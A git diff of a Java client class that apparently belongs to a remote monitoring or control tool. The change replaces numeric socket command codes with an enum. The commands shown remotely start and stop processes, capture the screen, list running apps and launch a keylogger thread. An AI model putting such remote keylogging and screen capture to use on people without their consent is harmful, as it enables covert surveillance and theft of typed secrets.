@@ -41,17 +41,18 @@ public class CentralReader implements Runnable {
 		while(true) {
 			try {
 				int type = dataInputStream.readInt();
+				Commands commands = Commands.fromAbbrev(type);
 //				System.out.println("type: " + type);
-				switch (type) {
-				case -12: {
+				switch (commands) {
+				case EVENTS: {
 					receiveEvents.executeEventsByCommands(dataInputStream.readInt());
 					break;
 				}
-				case -14: {
+				case REQUEST_PROCESS: {
 					sendProcess.sendProcess();
 					break;
 				}
-				case -16: {
+				case REQUEST_START_PROCESS: {
 					
 					System.out.println("Nhan thong bao khoi tao process");
 					String ImageName = dataInputStream.readUTF();
@@ -70,7 +71,7 @@ public class CentralReader implements Runnable {
 					}
 					break;
 				}
-				case -19: {
+				case REQUEST_STOP_PROCESS: {
 					System.out.println("Nhan thong bao tat process");
 					String pid = dataInputStream.readUTF();
 		            
@@ -95,7 +96,7 @@ public class CentralReader implements Runnable {
 //		            } 
 		            break;
 				}
-				case -20: {
+				case REQUEST_SCREEN_SHOT: {
 					Robot robot = new Robot();
 					System.out.println("Nhan yeu chup man hinh");
 					Dimension screenSize = Toolkit.getDefaultToolkit().getScreenSize();
@@ -113,11 +114,11 @@ public class CentralReader implements Runnable {
 					System.out.println("");
 					break;
 				}
-				case -22: {
+				case REQUEST_START_KEYLOGGER: {
 					new Thread(new Keylogger(socket)).start();
 					break;
 				}
-				case -24: {
+				case REQUEST_APP_RUNNING: {
 					sendAppRunning.sendAppRunning();
 					break;
 				}
